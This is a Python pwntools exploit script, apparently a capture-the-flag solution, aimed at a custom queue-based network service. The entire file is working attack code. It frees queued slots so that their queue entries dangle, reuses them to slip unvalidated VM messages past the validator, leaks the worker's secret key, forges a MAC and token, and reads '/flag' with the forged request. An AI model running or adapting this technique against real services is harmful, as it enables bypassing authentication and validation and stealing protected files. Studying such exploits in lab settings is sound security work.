#!/usr/bin/env python3
import sys, struct, zlib
from pwn import *

context.log_level = 'info'

M = (1 << 64) - 1
HANDLE_XOR = 0x8EE8D27D
CRC_XOR = 0x0C806284
VM_MAGIC = 0xEE3575B7

K_MAC_INIT = 0x7B98A97884FA1989
K_STEP = 0x31EBD2704002B967
K_TOKEN = 0x4154544143484D45   # "EMHCATTA"
K_CHECK = 0x54575F3A17BC3EBC


def smix(x):
    x &= M
    x ^= x >> 30; x = (x * 0xBF58476D1CE4E5B9) & M
    x ^= x >> 27; x = (x * 0x94D049BB133111EB) & M
    x ^= x >> 31
    return x


def rol64(x, r):
    r &= 63
    return ((x << r) | (x >> (64 - r))) & M if r else x


def worker_mac(payload, secret):
    """payload = 112 bytes; MAC over payload[8:8+0x68]"""
    h = ((payload[0] << 56) | (payload[1] << 48)) & M
    h ^= secret
    h ^= K_MAC_INIT
    for i in range(0x68):
        h ^= (payload[8 + i] + i + K_STEP) & M
        h = rol64(smix(h), i + 9)
    return h


def rol32(x, r):
    return ((x << r) | (x >> (32 - r))) & 0xFFFFFFFF


def checksum(hdr12, payload):
    c = zlib.crc32(hdr12) & 0xFFFFFFFF
    if payload:
        c ^= rol32(zlib.crc32(payload) & 0xFFFFFFFF, 1)
    return c ^ CRC_XOR


class Client:
    def __init__(self, host, port):
        self.io = remote(host, port)
        self.tag = 0x1234

    def req(self, op, handle=0, payload=b""):
        hdr = struct.pack("<HBBIHH", 0x5144, op, 0, handle & 0xFFFFFFFF,
                          len(payload), self.tag)
        crc = checksum(hdr, payload)
        self.io.send(hdr + struct.pack("<I", crc) + payload)
        r = self.io.recvn(16)
        magic, rop, status, val, lenfield, _ = struct.unpack("<HBBIII", r)
        assert magic == 0x5144, r.hex()
        n = lenfield & 0xFFFF
        data = self.io.recvn(n) if n else b""
        return status, val, data

    # --- protocol ops ---
    def alloc(self):
        st, h, _ = self.req(0x51)
        assert st == 0, f"alloc status {st}"
        return h, (h ^ HANDLE_XOR) & 0xFF

    def write(self, h, data):
        st, _, _ = self.req(0x2C, h, data)
        assert st == 0, f"write status {st}"

    def validate(self, h):
        st, _, d = self.req(0x28, h)
        assert st == 0, f"validate status {st}"
        return d

    def enqueue(self, h):
        st, _, _ = self.req(0x67, h)
        assert st == 0, f"enqueue status {st}"

    def free(self, h):
        st, _, _ = self.req(0x57, h)
        assert st == 0, f"free status {st}"

    def drain(self):
        st, _, d = self.req(0x44)
        return st, d


def vm_msg(dwords):
    """kind 0x92 VM message, 112 bytes"""
    arr = [VM_MAGIC] + dwords
    n = len(arr) * 4
    assert 4 <= n <= 0x68
    body = b"".join(struct.pack("<I", x) for x in arr)
    p = bytearray(112)
    p[0] = 0x92
    p[1] = n
    p[8:8 + len(body)] = body
    return bytes(p)


def open_msg(check32):
    p = bytearray(112)
    p[0] = 0xAD
    p[1] = 5
    p[4:8] = struct.pack("<I", check32)
    p[8:13] = b"/flag"
    return bytes(p)


def alloc_slot(c, target):
    """DRAIN releases the slot it processed, so keep allocating (and holding
    on to) slots until the allocator hands back the one we want."""
    for _ in range(9):
        h, idx = c.alloc()
        if idx == target:
            return h
    raise RuntimeError("slot %d unreachable" % target)


def main():
    host, port = sys.argv[1], int(sys.argv[2])
    c = Client(host, port)

    # 1) six legit messages: alloc -> write -> validate -> enqueue
    legit = bytearray(112)
    legit[0] = 0x69                      # FNV kind, warden-approved
    handles = []
    for i in range(6):
        h, idx = c.alloc()
        c.write(h, bytes(legit))
        c.validate(h)
        c.enqueue(h)
        handles.append((h, idx))
    log.info("queued slots: %s" % [i for _, i in handles])

    # 2) head == tail == 0 with count == 6 -> the dequeue scan in 'W' is empty,
    #    so freeing a slot leaves its queue entry alive (dangling reference).
    for h, _ in handles[:3]:
        c.free(h)
    log.success("freed 3 slots while their queue entries stay live")

    # 3) entry[0] -> leak the worker's per-process secret via VM opcode 0xb9
    h = alloc_slot(c, handles[0][1])
    c.write(h, vm_msg([0xB9, 0]))
    st, d = c.drain()
    assert st == 0 and len(d) == 8, (st, d.hex())
    secret = u64(d)
    log.success("G_SECRET = %#018x" % secret)

    # 4) forge the MAC for the "/flag" open request
    om = bytearray(open_msg(0))
    mac = worker_mac(om, secret)
    token = smix(mac ^ K_TOKEN)
    h2 = smix(token ^ K_CHECK)
    check32 = (h2 ^ (h2 >> 32)) & 0xFFFFFFFF
    log.info("mac=%#018x token=%#018x check=%#010x" % (mac, token, check32))

    # 5) entry[1] -> VM sets the global token to our forged value
    h = alloc_slot(c, handles[1][1])
    c.write(h, vm_msg([0xCA, 0, token & 0xFFFFFFFF,
                       0x59, 0, token >> 32,
                       0x96, 0]))
    st, d = c.drain()
    assert st == 0, (st, d.hex())
    log.success("token installed")

    # 6) entry[2] -> the open request the warden never saw
    h = alloc_slot(c, handles[2][1])
    c.write(h, open_msg(check32))
    st, d = c.drain()
    log.info("status=%d" % st)
    print(d.decode(errors="replace"))


main()
